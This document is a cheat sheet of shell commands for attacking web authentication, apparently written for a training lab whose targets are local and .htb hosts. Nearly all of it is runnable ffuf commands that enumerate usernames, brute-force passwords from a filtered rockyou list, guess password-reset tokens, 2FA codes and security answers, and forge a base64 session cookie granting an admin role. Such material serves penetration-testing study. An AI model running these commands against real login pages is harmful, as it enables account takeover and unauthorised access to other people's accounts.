# Authentication Testing Commands Cheat Sheet

## User Enumeration

### Using ffuf for username enumeration
```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
     -u http://172.17.0.2/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=FUZZ&password=invalid" \
     -fr "Unknown user"
```

## Password Brute-forcing

### Count lines in wordlist
```bash
wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

### Filter passwords by policy (uppercase, lowercase, digit, min 10 chars)
```bash
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | \
grep '[[:lower:]]' | \
grep '[[:digit:]]' | \
grep -E '.{10}' > custom_wordlist.txt
```

### Password brute-force with ffuf
```bash
ffuf -w ./custom_wordlist.txt \
     -u http://172.17.0.2/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=FUZZ" \
     -fr "Invalid username"
```

## Token/Code Brute-forcing

### Generate sequential wordlist (0000-9999)
```bash
seq -w 0 9999 > tokens.txt
```

### Check first few lines of wordlist
```bash
head tokens.txt
```

### Brute-force password reset tokens
```bash
ffuf -w ./tokens.txt \
     -u http://weak_reset.htb/reset_password.php?token=FUZZ \
     -fr "The provided token is invalid"
```

### Brute-force 2FA codes with session cookie
```bash
ffuf -w ./tokens.txt \
     -u http://bf_2fa.htb/2fa.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" \
     -d "otp=FUZZ" \
     -fr "Invalid 2FA Code"
```

## Session Token Analysis

### Base64 decode session token
```bash
echo -n "dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy" | base64 -d
```

### Base64 encode modified session data
```bash
echo -n 'user=htb-stdnt;role=admin' | base64
```

### Hex encode session data
```bash
echo -n 'user=htb-stdnt;role=admin' | xxd -p
```

## Security Question Attacks

### Extract cities from CSV (first field)
```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

### Count wordlist entries
```bash
wc -l city_wordlist.txt
```

### Filter cities by country
```bash
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

### Brute-force security question with session
```bash
ffuf -w ./city_wordlist.txt \
     -u http://pwreset.htb/security_question.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" \
     -d "security_response=FUZZ" \
     -fr "Incorrect response."
```

## Key ffuf Parameters Reference

- `-w`: Wordlist file
- `-u`: Target URL
- `-X POST`: HTTP method
- `-H`: HTTP header
- `-d`: POST data (use FUZZ keyword for fuzzing)
- `-b`: Cookie data
- `-fr`: Filter out responses containing string
- `-fs`: Filter out responses by size
- `-fc`: Filter out responses by HTTP status code
